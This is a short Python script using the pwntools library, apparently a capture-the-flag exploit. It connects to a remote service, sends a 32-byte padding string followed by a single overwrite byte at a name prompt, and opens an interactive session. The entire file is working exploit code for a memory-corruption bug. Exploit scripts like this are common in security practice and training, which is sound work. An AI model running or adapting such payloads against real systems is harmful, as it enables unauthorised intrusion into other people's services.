from pwn import *

# io = process('./task')
# gdb.attach(io, api=True)
io = remote('rivit.dev', 10022)

payload = b'a'*32 + b'\x80'

io.sendlineafter(b'name?', payload)
io.interactive()